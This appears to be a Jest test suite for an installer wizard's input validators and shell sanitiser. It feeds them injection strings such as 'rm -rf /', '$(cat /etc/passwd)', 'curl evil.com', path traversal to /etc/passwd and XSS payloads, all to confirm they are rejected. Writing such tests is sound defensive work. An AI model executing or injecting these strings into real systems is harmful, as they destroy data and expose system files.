/**
 * Validators Test Suite
 * 
 * Tests security validators with malicious inputs (OWASP compliance)
 */

const {
  validateProjectType,
  validatePath,
  validateTextInput,
  validateProjectName,
  validateListSelection,
  sanitizeShellInput,
  INPUT_LIMITS,
  ALLOWED_PROJECT_TYPES,
} = require('../../packages/installer/src/wizard/validators');

describe('validators', () => {
  describe('validateProjectType', () => {
    test('accepts valid project types', () => {
      expect(validateProjectType('greenfield')).toBe(true);
      expect(validateProjectType('brownfield')).toBe(true);
      expect(validateProjectType('GREENFIELD')).toBe(true); // case insensitive
    });

    test('rejects invalid project types', () => {
      expect(validateProjectType('invalid')).toContain('Invalid project type');
      expect(validateProjectType('monolith')).toContain('Invalid project type');
      expect(validateProjectType('')).toContain('required'); // Empty string triggers "required" check first
    });

    test('rejects malicious inputs', () => {
      expect(validateProjectType('greenfield; rm -rf /')).toContain('Invalid project type');
      expect(validateProjectType('$(whoami)')).toContain('Invalid project type');
      expect(validateProjectType('<script>alert(1)</script>')).toContain('Invalid project type');
    });

    test('handles null/undefined', () => {
      expect(validateProjectType(null)).toContain('required');
      expect(validateProjectType(undefined)).toContain('required');
    });
  });

  describe('validatePath', () => {
    const baseDir = process.cwd();

    test('accepts valid paths', () => {
      expect(validatePath('./src', baseDir)).toBe(true);
      expect(validatePath('src/components', baseDir)).toBe(true);
      expect(validatePath('.', baseDir)).toBe(true);
    });

    test('rejects path traversal attacks', () => {
      expect(validatePath('../../../etc/passwd', baseDir)).toContain('path traversal');
      // Backslashes are caught by shell-special character check first on Windows
      expect(validatePath('..\\..\\..\\Windows\\System32', baseDir)).toContain('invalid characters');
      expect(validatePath('~/../../root', baseDir)).toContain('path traversal');
    });

    test('rejects shell-special characters', () => {
      expect(validatePath('src; rm -rf /', baseDir)).toContain('invalid characters');
      expect(validatePath('src | curl evil.com', baseDir)).toContain('invalid characters');
      expect(validatePath('src`whoami`', baseDir)).toContain('invalid characters');
      expect(validatePath('src$(cat /etc/passwd)', baseDir)).toContain('invalid characters');
    });

    test('rejects paths exceeding length limit', () => {
      const longPath = 'a'.repeat(INPUT_LIMITS.path + 1);
      expect(validatePath(longPath, baseDir)).toContain('too long');
    });

    test('handles null/undefined', () => {
      expect(validatePath(null, baseDir)).toContain('required');
      expect(validatePath(undefined, baseDir)).toContain('required');
    });
  });

  describe('validateTextInput', () => {
    test('accepts valid text', () => {
      expect(validateTextInput('valid text')).toBe(true);
      expect(validateTextInput('valid-text-123')).toBe(true);
      expect(validateTextInput('Hello World!')).toBe(true);
    });

    test('rejects command injection patterns', () => {
      expect(validateTextInput('; rm -rf /')).toContain('invalid characters');
      // All shell-special characters are caught by the first check
      expect(validateTextInput('$(whoami)')).toContain('invalid characters');
      expect(validateTextInput('`cat /etc/passwd`')).toContain('invalid characters');
      expect(validateTextInput('test && curl evil.com')).toContain('invalid characters');
      expect(validateTextInput('test || echo hacked')).toContain('invalid characters');
    });

    test('rejects XSS-style inputs', () => {
      // < and > are caught by shell-special character check first
      expect(validateTextInput('<script>alert(1)</script>')).toContain('invalid characters');
      expect(validateTextInput('<img src=x onerror=alert(1)>')).toContain('invalid characters');
    });

    test('rejects inputs exceeding length limit', () => {
      const longText = 'a'.repeat(INPUT_LIMITS.generic + 1);
      expect(validateTextInput(longText)).toContain('too long');
    });

    test('rejects empty/whitespace-only input', () => {
      expect(validateTextInput('')).toContain('required');
      expect(validateTextInput('   ')).toContain('empty');
    });

    test('respects custom length limit', () => {
      const text = 'a'.repeat(50);
      expect(validateTextInput(text, 100)).toBe(true);
      expect(validateTextInput(text, 40)).toContain('too long');
    });

    test('handles null/undefined', () => {
      expect(validateTextInput(null)).toContain('required');
      expect(validateTextInput(undefined)).toContain('required');
    });
  });

  describe('validateProjectName', () => {
    test('accepts valid project names', () => {
      expect(validateProjectName('my-project')).toBe(true);
      expect(validateProjectName('MyProject123')).toBe(true);
      expect(validateProjectName('project_name')).toBe(true);
    });

    test('rejects names with special characters', () => {
      expect(validateProjectName('my project')).toContain('letters, numbers, dashes');
      expect(validateProjectName('project!')).toContain('letters, numbers, dashes');
      expect(validateProjectName('project@123')).toContain('letters, numbers, dashes');
    });

    test('rejects names starting with dash/underscore', () => {
      expect(validateProjectName('-project')).toContain('start with a letter or number');
      expect(validateProjectName('_project')).toContain('start with a letter or number');
    });

    test('rejects malicious inputs', () => {
      expect(validateProjectName('project; rm -rf /')).toContain('letters, numbers, dashes');
      expect(validateProjectName('$(whoami)')).toContain('letters, numbers, dashes');
    });

    test('rejects names exceeding length limit', () => {
      const longName = 'a'.repeat(INPUT_LIMITS.projectName + 1);
      expect(validateProjectName(longName)).toContain('too long');
    });

    test('handles null/undefined', () => {
      expect(validateProjectName(null)).toContain('required');
      expect(validateProjectName(undefined)).toContain('required');
    });
  });

  describe('validateListSelection', () => {
    const allowedValues = ['option1', 'option2', 'option3'];

    test('accepts valid selections', () => {
      expect(validateListSelection('option1', allowedValues)).toBe(true);
      expect(validateListSelection('option2', allowedValues)).toBe(true);
    });

    test('rejects invalid selections', () => {
      expect(validateListSelection('option4', allowedValues)).toContain('Invalid selection');
      expect(validateListSelection('invalid', allowedValues)).toContain('Invalid selection');
    });

    test('handles null/undefined', () => {
      expect(validateListSelection(null, allowedValues)).toContain('required');
      expect(validateListSelection(undefined, allowedValues)).toContain('required');
    });
  });

  describe('sanitizeShellInput', () => {
    test('escapes shell-special characters', () => {
      expect(sanitizeShellInput('test; rm -rf /')).toBe('test\\; rm -rf /');
      expect(sanitizeShellInput('test`whoami`')).toBe('test\\`whoami\\`');
      expect(sanitizeShellInput('test$(cat file)')).toBe('test\\$\\(cat file\\)');
      expect(sanitizeShellInput('test\nline2')).toBe('test\\nline2');
    });

    test('handles quotes', () => {
      expect(sanitizeShellInput("test'quote")).toBe("test\\'quote");
      expect(sanitizeShellInput('test"quote')).toBe('test\\"quote');
    });

    test('handles backslashes', () => {
      expect(sanitizeShellInput('test\\path')).toBe('test\\\\path');
    });

    test('handles non-string input', () => {
      expect(sanitizeShellInput(null)).toBe('');
      expect(sanitizeShellInput(undefined)).toBe('');
      expect(sanitizeShellInput(123)).toBe('');
    });
  });

  describe('Buffer Overflow Protection', () => {
    test('rejects 10,000 character strings', () => {
      const massiveInput = 'a'.repeat(10000);
      expect(validateTextInput(massiveInput)).toContain('too long');
      expect(validateProjectName(massiveInput)).toContain('too long');
      expect(validatePath(massiveInput)).toContain('too long');
    });
  });

  describe('Constants Export', () => {
    test('exports INPUT_LIMITS', () => {
      expect(INPUT_LIMITS).toBeDefined();
      expect(INPUT_LIMITS.projectName).toBe(100);
      expect(INPUT_LIMITS.path).toBe(255);
      expect(INPUT_LIMITS.generic).toBe(500);
    });

    test('exports ALLOWED_PROJECT_TYPES', () => {
      expect(ALLOWED_PROJECT_TYPES).toBeDefined();
      expect(ALLOWED_PROJECT_TYPES).toContain('greenfield');
      expect(ALLOWED_PROJECT_TYPES).toContain('brownfield');
    });
  });
});

